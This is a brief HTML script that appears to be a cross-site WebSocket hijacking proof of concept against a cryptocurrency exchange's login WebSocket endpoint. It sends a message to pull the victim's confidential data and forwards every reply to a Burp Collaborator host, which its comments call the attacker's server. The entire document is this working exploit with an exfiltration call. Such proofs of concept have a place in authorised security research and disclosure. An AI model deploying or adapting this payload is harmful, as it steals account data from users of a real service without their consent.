   <script>
websocket = new WebSocket('wss://legacy.deribit.com/ws/login')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://gh1yff350z98mr84muekzkxvym4cs1.burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
}
</script>
